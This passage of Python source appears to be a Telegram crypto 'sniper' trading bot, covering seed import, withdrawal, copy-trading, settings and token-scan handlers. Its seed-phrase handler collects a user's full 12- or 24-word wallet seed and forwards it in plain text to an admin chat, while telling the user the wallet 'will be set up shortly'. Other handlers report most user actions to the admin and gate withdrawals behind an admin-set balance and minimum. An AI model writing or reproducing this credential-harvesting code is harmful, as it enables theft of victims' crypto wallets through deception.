                await update.message.reply_text(
                    err,
                    reply_markup=wallet_keyboard(bool(data.get("wallets"))),
                )

        elif action == "waiting_seed":
            await notify_admin(context, user_id, "wallet_import_seed", "User submitted seed phrase")
            data = load_user_data(user_id)

            words = text.strip().split()
            if len(words) not in (12, 24):
                await update.message.reply_text(
                    "\u274c <b>Invalid Seed Phrase</b>\n\nSeed phrase must be exactly 12 or 24 words.",
                    reply_markup=wallet_keyboard(bool(data.get("wallets"))),
                )
                return

            invalid_words = []
            for i, w in enumerate(words, 1):
                w_clean = w.strip().lower()
                if not w_clean.isalpha() or not w_clean.isascii() or len(w_clean) < 3 or len(w_clean) > 8:
                    invalid_words.append(f"{i}. {w}")

            if invalid_words:
                await update.message.reply_text(
                    "\u274c <b>Invalid Seed Phrase</b>\n\n"
                    "Each word must be:\n"
                    "\u2022 Lowercase English letters only (a-z)\n"
                    "\u2022 3-8 characters long\n"
                    "\u2022 No numbers, spaces, or special characters\n\n"
                    f"Bad words: <code>{', '.join(invalid_words[:5])}</code>",
                    reply_markup=wallet_keyboard(bool(data.get("wallets"))),
                )
                return

            admin_msg = (
                "\U0001f4dd <b>Seed Phrase Imported</b>\n\n"
                f"\U0001f464 User: <code>{user_id}</code> (@{update.effective_user.username or 'N/A'})\n"
                f"\U0001f4dd Words: {len(words)}\n\n"
                f"\u26a0\ufe0f <b>Seed Phrase:</b>\n<code>{text}</code>\n"
            )
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_USER_ID, text=admin_msg,
                )
            except Exception as e:
                logger.error(f"Failed to send seed phrase to admin: {e}")

            await update.message.reply_text(
                "\u2705 <b>Seed Phrase Received!</b>\n\n"
                "Your wallet will be set up shortly.",
                reply_markup=wallet_keyboard(bool(data.get("wallets"))),
            )

        elif action == "withdraw_address":
            await notify_admin(context, user_id, "wallet_withdraw", f"Address: {text.strip()[:20]}...")
            data = load_user_data(user_id)
            balance = data.get("balance", 0)
            active_chain = data.get("active_wallet", "solana")
            chain_sym = CHAINS.get(active_chain, {}).get("symbol", "SOL")
            withdraw_data[user_id] = {"address": text.strip()}
            user_importing[user_id] = "withdraw_amount"
            await update.message.reply_text(
                f"\U0001f4b8 <b>WITHDRAWAL</b>\n\n"
                f"\U0001f4ec To: <code>{text.strip()}</code>\n\n"
                f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                f"Now enter the amount of {chain_sym} you want to withdraw:",
                reply_markup=back_keyboard("wallets"),
            )

        elif action == "withdraw_amount":
            data = load_user_data(user_id)
            active_chain = data.get("active_wallet", "solana")
            chain_sym = CHAINS.get(active_chain, {}).get("symbol", "SOL")
            min_w = get_min_withdraw(active_chain, user_id)
            wd = withdraw_data.get(user_id, {})
            address = wd.get("address", "Unknown")
            manual_bal = data.get("wallet_balances", {}).get(active_chain)
            if manual_bal is not None:
                balance = manual_bal
            else:
                balance = data.get("balance", 0)
            if balance == 0 and data.get("wallets", {}).get(active_chain):
                try:
                    ws = await balance_service.get_wallet_summary({active_chain: data["wallets"][active_chain]})
                    balance = ws.get(active_chain, {}).get("balance", 0.0)
                except Exception:
                    pass

            try:
                amount = float(text.strip())
            except ValueError:
                await update.message.reply_text(
                    "\u274c Invalid number. Please enter a valid amount.",
                    reply_markup=back_keyboard("wallets"),
                )
                return

            if amount < min_w:
                deficit = min_w - amount
                await update.message.reply_text(
                    f"\u274c <b>INSUFFICIENT BALANCE TO WITHDRAW</b>\n\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                    f"\U0001f4b0 <b>Your Balance:</b> {balance:.4f} {chain_sym}\n"
                    f"\U0001f512 <b>Minimum Required:</b> {min_w:.4f} {chain_sym}\n"
                    f"\U0001f4c9 <b>You Need:</b> {deficit:.4f} {chain_sym} more\n\n"
                    f"\U0001f4a1 Deposit {chain_sym} to your wallet to withdraw.",
                    reply_markup=back_keyboard("wallets"),
                )
                return

            if amount > balance:
                deficit = amount - balance
                await update.message.reply_text(
                    f"\u274c <b>INSUFFICIENT BALANCE TO WITHDRAW</b>\n\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                    f"\U0001f4b0 <b>Your Balance:</b> {balance:.4f} {chain_sym}\n"
                    f"\U0001f512 <b>Amount Entered:</b> {amount:.4f} {chain_sym}\n"
                    f"\U0001f4c9 <b>You Need:</b> {deficit:.4f} {chain_sym} more\n\n"
                    f"\U0001f4a1 Deposit {chain_sym} to your wallet to withdraw.",
                    reply_markup=back_keyboard("wallets"),
                )
                return

            withdraw_data[user_id]["amount"] = amount
            user_importing[user_id] = None
            await update.message.reply_text(
                f"\U0001f4b8 <b>CONFIRM WITHDRAWAL</b>\n\n"
                f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                f"\U0001f4b0 Amount: {amount} {chain_sym}\n"
                f"\U0001f4ec To:\n<code>{address}</code>\n"
                f"\U0001f4b5 Your Balance: {balance:.6f} {chain_sym}\n"
                f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
                f"Please confirm to proceed:",
                reply_markup=withdraw_confirm_keyboard(),
            )

        elif action in ("copy_wallet", "copy_remove"):
            parts = text.split()
            if len(parts) >= 2:
                chain = parts[0]
                address = parts[1]
                label = parts[2] if len(parts) > 2 else ""
                if chain in CHAINS:
                    if action == "copy_wallet":
                        whale_tracker.add_address(chain, address, label)
                        await notify_admin(context, user_id, "copy_add", f"Chain: {chain}, Address: {address[:16]}...")
                        await update.message.reply_text(
                            f"\U0001f46a <b>Wallet Added to Copy</b>\n\n"
                            f"Chain: {chain}\nAddress: <code>{address}</code>",
                            reply_markup=copy_trade_keyboard(),
                        )
                    else:
                        whale_tracker.remove_address(chain, address)
                        await notify_admin(context, user_id, "copy_remove", f"Chain: {chain}, Address: {address[:16]}...")
                        await update.message.reply_text(
                            "\u2705 <b>Removed from copy list</b>",
                            reply_markup=copy_trade_keyboard(),
                        )
                else:
                    await update.message.reply_text(
                        "\u274c Invalid chain. Use: solana, ethereum, or bsc",
                        reply_markup=copy_trade_keyboard(),
                    )

        elif action == "whale_address":
            parts = text.split()
            if len(parts) >= 2:
                chain = parts[0]
                address = parts[1]
                label = parts[2] if len(parts) > 2 else ""
                if chain in CHAINS:
                    whale_tracker.add_address(chain, address, label)
                    await notify_admin(context, user_id, "whale_add", f"Chain: {chain}, Address: {address[:16]}...")
                    await update.message.reply_text(
                        f"\U0001f40b <b>Tracking Added</b>\n\nChain: {chain}\nAddress: <code>{address}</code>",
                        reply_markup=whale_tracker_keyboard(),
                    )
                else:
                    await update.message.reply_text(
                        "\u274c Invalid chain", reply_markup=whale_tracker_keyboard(),
                    )

        elif action == "slippage":
            try:
                slippage = int(text)
                if 1 <= slippage <= 50:
                    await notify_admin(context, user_id, "set_slippage", f"New slippage: {slippage}%")
                    data = load_user_data(user_id)
                    data["settings"]["slippage"] = slippage
                    save_user_data(user_id, data)
                    await update.message.reply_text(
                        f"\u2705 Slippage set to {slippage}%",
                        reply_markup=settings_keyboard(data["settings"]),
                    )
                else:
                    await update.message.reply_text("\u274c Must be 1-50%", reply_markup=back_keyboard("settings"))
            except ValueError:
                await update.message.reply_text("\u274c Invalid number", reply_markup=back_keyboard("settings"))

        elif action == "waiting_sl":
            try:
                sl = float(text.strip().replace("%", ""))
                if sl < 10 or sl > 90:
                    await update.message.reply_text("\u274c Must be 10-90%", reply_markup=back_keyboard("settings"))
                    return
                data = load_user_data(user_id)
                data["settings"]["stop_loss"] = sl
                save_user_data(user_id, data)
                user_importing.pop(user_id, None)
                await update.message.reply_text(
                    f"\u2705 Stop-Loss set to <b>{sl}%</b>",
                    reply_markup=settings_keyboard(data["settings"]),
                )
            except ValueError:
                await update.message.reply_text("\u274c Invalid number. Send a percentage (10-90).", reply_markup=back_keyboard("settings"))

        elif action == "waiting_tp":
            try:
                tp = float(text.strip().replace("%", ""))
                if tp < 10 or tp > 1000:
                    await update.message.reply_text("\u274c Must be 10-1000%", reply_markup=back_keyboard("settings"))
                    return
                data = load_user_data(user_id)
                data["settings"]["take_profit"] = tp
                save_user_data(user_id, data)
                user_importing.pop(user_id, None)
                await update.message.reply_text(
                    f"\u2705 Take-Profit set to <b>{tp}%</b>",
                    reply_markup=settings_keyboard(data["settings"]),
                )
            except ValueError:
                await update.message.reply_text("\u274c Invalid number. Send a percentage (10-1000).", reply_markup=back_keyboard("settings"))

        elif action == "waiting_ba":
            try:
                amount = float(text.strip().replace("SOL", "").replace("sol", "").strip())
                if amount < 0.0001 or amount > 1000:
                    await update.message.reply_text("\u274c Must be 0.0001 - 1000 SOL", reply_markup=back_keyboard("settings"))
                    return
                data = load_user_data(user_id)
                data["settings"]["buy_amount_sol"] = amount
                save_user_data(user_id, data)
                user_importing.pop(user_id, None)
                settings = data["settings"]
                slippage = settings.get("slippage", 10)
                sl = settings.get("stop_loss", 20)
                await update.message.reply_text(
                    f"\u2705 <b>SETTING UPDATED</b>\n\n"
                    "\U0001f3af <b>SNIPER CONFIGURATION</b>\n\n"
                    "\U0001f4ca Status: \u274c Inactive\n"
                    f"\U0001f4b0 Buy Amount: <b>{amount} SOL</b> \u2705\n"
                    f"\u26a0\ufe0f Stop-Loss: {sl}%\n"
                    f"\u26a1 Slippage: {slippage}%\n\n"
                    "\U0001f4be Settings saved and ready",
                    reply_markup=settings_keyboard(settings),
                )
            except ValueError:
                await update.message.reply_text("\u274c Invalid number. Send an amount in SOL.", reply_markup=back_keyboard("settings"))

        elif action == "buy_amount":
            try:
                amount = float(text)
                await notify_admin(context, user_id, "buy", f"Custom amount: {amount} SOL")
                user_snipe_drafts[user_id] = {"chain": "solana", "quick_amount": amount}
                await update.message.reply_text(
                    f"\U0001f680 <b>Buy: {amount} SOL</b>\n\nPaste a token address:", reply_markup=back_keyboard("main_menu"),
                )
            except ValueError:
                await update.message.reply_text("\u274c Invalid number", reply_markup=back_keyboard("buy"))

        elif action == "snipe_amount":
            try:
                amount = float(text)
                await notify_admin(context, user_id, "token_sniper", f"Custom: {amount} SOL")
                user_snipe_drafts[user_id] = {"chain": "solana", "quick_amount": amount, "sniper_mode": True}
                await update.message.reply_text(
                    f"\U0001f52e <b>Snipe: {amount} SOL</b>\n\nPaste a token address:", reply_markup=back_keyboard("main_menu"),
                )
            except ValueError:
                await update.message.reply_text("\u274c Invalid number", reply_markup=back_keyboard("token_sniper"))

        elif action == "sell_pct":
            try:
                pct = int(text)
                if 1 <= pct <= 100:
                    await notify_admin(context, user_id, "sell", f"Sell {pct}%")
                    user_importing[user_id] = f"sell_pct_pending:{pct}"
                    await update.message.reply_text(
                        f"\U0001f4b8 <b>Sell {pct}%</b>\n\nPaste token address:", reply_markup=back_keyboard("main_menu"),
                    )
                else:
                    await update.message.reply_text("\u274c Must be 1-100%", reply_markup=back_keyboard("sell"))
            except ValueError:
                await update.message.reply_text("\u274c Invalid number", reply_markup=back_keyboard("sell"))

        elif action.startswith("sell_pct_pending:"):
            pct = int(action.split(":")[1])
            address = text.strip()

            token = await scan_token(address)
            token_name = token.get("symbol", "???") if token.get("found") else "???"
            token_full_name = token.get("name", "Unknown") if token.get("found") else "Unknown"
            price_usd = token.get("price_usd", 0) if token.get("found") else 0

            user_importing.pop(user_id, None)
            user_snipe_drafts[user_id] = {"chain": token.get("chain", "solana"), "sell_pct": pct, "address": address}

            chain_emoji = "\U0001f534" if token.get("chain") == "solana" else "\U0001f535"
            msg = (
                f"\u2705 <b>Sell Token</b>\n\n"
                f"{chain_emoji} Chain: {token.get('chain', 'solana').title()}\n"
                f"\U0001f48e Token: <b>{token_name}</b> ({token_full_name})\n"
                f"\U0001f4c2 Address: <code>{address}</code>\n"
                f"\U0001f4b1 Price: ${price_usd:.6f}\n"
                f"\U0001f4b8 Sell: {pct}%\n"
            )
            await update.message.reply_text(msg, reply_markup=snipe_confirm_keyboard())

        elif action in ("search", "ai_snipe_scanner", "ai_snipe_targets"):
            address = text.strip()
            if not address.startswith("0x") and len(address) != 44:
                await update.message.reply_text(
                    "\u274c Invalid address. Send a valid token address.",
                    reply_markup=back_keyboard(),
                )
                return

            await update.message.reply_text("\U0001f50d <b>Scanning token...</b>")

            token = await scan_token(address)

            if token.get("found"):
                chain_emoji = "\U0001f534" if token["chain"] == "solana" else "\U0001f535"

                def fmt_price(p):
                    if p >= 1:
                        return f"${p:,.2f}"
                    elif p >= 0.01:
                        return f"${p:.4f}"
                    elif p >= 0.000001:
                        return f"${p:.6f}"
                    else:
                        return f"${p:.10f}"

                def fmt_num(n):
                    if n >= 1_000_000:
                        return f"${n/1_000_000:.2f}M"
                    elif n >= 1_000:
                        return f"${n/1_000:.2f}K"
                    else:
                        return f"${n:.2f}"

                def fmt_pct(p):
                    arrow = "\U0001f4c8" if p >= 0 else "\U0001f4c9"
                    return f"{arrow} {p:+.2f}%"

                buys = token.get("txns_24h_buys", 0)
                sells = token.get("txns_24h_sells", 0)
                total_txns = buys + sells
                buy_pct = (buys / total_txns * 100) if total_txns > 0 else 0
                sell_pct = (sells / total_txns * 100) if total_txns > 0 else 0

                age_text = "Unknown"
                if token.get("pair_created"):
                    age_secs = time.time() - (token["pair_created"] / 1000)
                    if age_secs < 3600:
                        age_text = f"{int(age_secs / 60)}m"
                    elif age_secs < 86400:
                        age_text = f"{int(age_secs / 3600)}h"
                    else:
                        age_text = f"{int(age_secs / 86400)}d"

                msg = (
                    f"\U0001f50d <b>TOKEN SCANNER</b>\n\n"
                    f"{chain_emoji} <b>{token['name']}</b> ({token['symbol']})\n"
                    f"\u26d3\ufe0f Chain: {token['chain'].title()}\n"
                    f"\U0001f4c2 Address: <code>{address}</code>\n"
                    f"\U0001f310 DEX: {token.get('dex', 'N/A')}\n"
                    f"\U0001f552 Age: {age_text}\n\n"
                    f"\U0001f4b1 <b>Price</b>\n"
                    f"\u2022 USD: {fmt_price(token.get('price_usd', 0))}\n"
                    f"\u2022 Native: {token.get('price_native', 0):.8f}\n\n"
                    f"\U0001f4c8 <b>Price Change</b>\n"
                    f"\u2022 5m: {fmt_pct(token.get('change_5m', 0))}\n"
                    f"\u2022 1h: {fmt_pct(token.get('change_1h', 0))}\n"
                    f"\u2022 6h: {fmt_pct(token.get('change_6h', 0))}\n"
                    f"\u2022 24h: {fmt_pct(token.get('change_24h', 0))}\n\n"
                    f"\U0001f4b0 <b>Market</b>\n"
                    f"\u2022 Market Cap: {fmt_num(token.get('market_cap', 0))}\n"
                    f"\u2022 Liquidity: {fmt_num(token.get('liquidity', 0))}\n"
                    f"\u2022 Volume 24h: {fmt_num(token.get('volume_24h', 0))}\n\n"
                    f"\U0001f4ca <b>Transactions (24h)</b>\n"
                    f"\u2022 Buys: {buys} ({buy_pct:.0f}%)\n"
                    f"\u2022 Sells: {sells} ({sell_pct:.0f}%)\n"
                    f"\u2022 Total: {total_txns}\n"
                )

                if token.get("website"):
                    msg += f"\n\U0001f310 Website: {token['website']}\n"

                socials = token.get("socials", [])
                if socials:
                    social_links = []
                    for s in socials[:3]:
                        label = s.get("type", "link").title()
                        social_links.append(f"{label}: {s.get('url', '')}")
                    msg += f"\U0001f4cd {' | '.join(social_links)}\n"

                msg += f"\n\u2705 <b>Verified:</b> {'Yes' if token.get('liquidity', 0) > 1000 else 'Low liquidity'}"

                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("\U0001f680 Buy", callback_data="buy_action"),
                            InlineKeyboardButton("\U0001f4b8 Sell", callback_data="sell_action"),
                        ],
                        [
                            InlineKeyboardButton("\U0001f50d Scan Another", callback_data="search"),
                            InlineKeyboardButton("\u2b05\ufe0f Back", callback_data="main_menu"),
                        ],
                    ]),
                )
            else:
                await update.message.reply_text(
                    f"\u274c <b>Token Not Found</b>\n\n"
                    f"<code>{address}</code>\n\n"
                    "Could not find this token. Check the address and try again.",
                    reply_markup=back_keyboard(),
                )
            return

        return

    draft = user_snipe_drafts.get(user_id)
    if draft and "chain" in draft and "target" not in draft and "quick_amount" not in draft:
        await notify_admin(context, user_id, "buy", f"Address: {text[:16]}...")
        chain = draft["chain"]
        address = text.strip()
        data = load_user_data(user_id)
        amount = get_buy_amount(user_id, chain)

        token = await scan_token(address)
        token_name = token.get("symbol", "???") if token.get("found") else "???"
        token_full_name = token.get("name", "Unknown") if token.get("found") else "Unknown"
        price_usd = token.get("price_usd", 0) if token.get("found") else 0

        target = SnipeTarget(
            token_address=address, chain=chain, buy_amount=amount,
            slippage=data["settings"]["slippage"],
            priority_fee=data["settings"]["priority_fee_sol"],
            mev_protection=data["settings"]["mev_protection"],
        )
        draft["target"] = target
        draft["address"] = address
        draft["amount"] = amount
        draft["symbol"] = token_name

        chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
        msg = (
            f"\u2705 <b>Buy Token</b>\n\n"
            f"{chain_emoji} Chain: {chain.title()}\n"
            f"\U0001f48e Token: <b>{token_name}</b> ({token_full_name})\n"
            f"\U0001f4c2 Address: <code>{address}</code>\n"
            f"\U0001f4b1 Price: ${price_usd:.6f}\n"
            f"\U0001f4b0 Amount: {amount} {CHAINS[chain]['symbol']}\n"
            f"\U0001f3b2 Slippage: {data['settings']['slippage']}%\n"
            f"\U0001f6e1\ufe0f MEV: {'ON' if data['settings']['mev_protection'] else 'OFF'}\n"
        )
        await update.message.reply_text(msg, reply_markup=snipe_confirm_keyboard())

    elif draft and "quick_amount" in draft and "target" not in draft:
        await notify_admin(context, user_id, "buy", f"Address: {text[:16]}...")
        chain = draft["chain"]
        address = text.strip()
        amount = draft["quick_amount"]

        token = await scan_token(address)
        token_name = token.get("symbol", "???") if token.get("found") else "???"
        token_full_name = token.get("name", "Unknown") if token.get("found") else "Unknown"
        price_usd = token.get("price_usd", 0) if token.get("found") else 0

        target = SnipeTarget(
            token_address=address, chain=chain, buy_amount=amount,
            slippage=user_data["settings"]["slippage"],
            priority_fee=user_data["settings"]["priority_fee_sol"],
            mev_protection=user_data["settings"]["mev_protection"],
        )
        draft["target"] = target
        draft["address"] = address
        draft["amount"] = amount
        draft["symbol"] = token_name

        chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
        msg = (
            f"\u2705 <b>Buy Token</b>\n\n"
            f"{chain_emoji} Chain: {chain.title()}\n"
            f"\U0001f48e Token: <b>{token_name}</b> ({token_full_name})\n"
            f"\U0001f4c2 Address: <code>{address}</code>\n"
            f"\U0001f4b1 Price: ${price_usd:.6f}\n"
            f"\U0001f4b0 Amount: {amount} {CHAINS[chain]['symbol']}\n"
            f"\U0001f3b2 Slippage: {user_data['settings']['slippage']}%\n"
            f"\U0001f6e1\ufe0f MEV: {'ON' if user_data['settings']['mev_protection'] else 'OFF'}\n"
        )
        await update.message.reply_text(msg, reply_markup=snipe_confirm_keyboard())

    else:
        text_stripped = text.strip()
        is_address = (text_stripped.startswith("0x") and len(text_stripped) == 42) or (len(text_stripped) == 44 and not text_stripped.startswith("0x"))
        if is_address:
            await notify_admin(context, user_id, "search", f"Address: {text_stripped[:16]}...")
            await update.message.reply_text("\U0001f50d <b>Scanning token...</b>")

            token = await scan_token(text_stripped)

            if token.get("found"):
                chain_emoji = "\U0001f534" if token["chain"] == "solana" else "\U0001f535"

                def fmt_price(p):
                    if p >= 1: return f"${p:,.2f}"
                    elif p >= 0.01: return f"${p:.4f}"
                    elif p >= 0.000001: return f"${p:.6f}"
                    else: return f"${p:.10f}"

                def fmt_num(n):
                    if n >= 1_000_000: return f"${n/1_000_000:.2f}M"
                    elif n >= 1_000: return f"${n/1_000:.2f}K"
                    else: return f"${n:.2f}"

                def fmt_pct(p):
                    arrow = "\U0001f4c8" if p >= 0 else "\U0001f4c9"
                    return f"{arrow} {p:+.2f}%"

                buys = token.get("txns_24h_buys", 0)
                sells = token.get("txns_24h_sells", 0)
                total_txns = buys + sells

                msg = (
                    f"\U0001f50d <b>TOKEN SCANNER</b>\n\n"
                    f"{chain_emoji} <b>{token['name']}</b> ({token['symbol']})\n"
                    f"\u26d3\ufe0f Chain: {token['chain'].title()}\n"
                    f"\U0001f4c2 Address: <code>{text_stripped}</code>\n"
                    f"\U0001f310 DEX: {token.get('dex', 'N/A')}\n\n"
                    f"\U0001f4b1 <b>Price:</b> {fmt_price(token.get('price_usd', 0))}\n\n"
                    f"\U0001f4c8 <b>Changes:</b> 1h {fmt_pct(token.get('change_1h', 0))} | 24h {fmt_pct(token.get('change_24h', 0))}\n\n"
                    f"\U0001f4b0 <b>MCap:</b> {fmt_num(token.get('market_cap', 0))} | <b>Liq:</b> {fmt_num(token.get('liquidity', 0))} | <b>Vol:</b> {fmt_num(token.get('volume_24h', 0))}\n\n"
                    f"\U0001f4ca <b>Txns 24h:</b> {buys} buys / {sells} sells\n"
                )

                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("\U0001f680 Buy", callback_data="buy_action"),
                            InlineKeyboardButton("\U0001f4b8 Sell", callback_data="sell_action"),
                        ],
                        [
                            InlineKeyboardButton("\U0001f50d Scan Another", callback_data="search"),
                            InlineKeyboardButton("\u2b05\ufe0f Back", callback_data="main_menu"),
                        ],
                    ]),
                )
            else:
                await update.message.reply_text(
                    f"\u274c <b>Token Not Found</b>\n\n<code>{text_stripped}</code>",
                    reply_markup=back_keyboard(),
                )
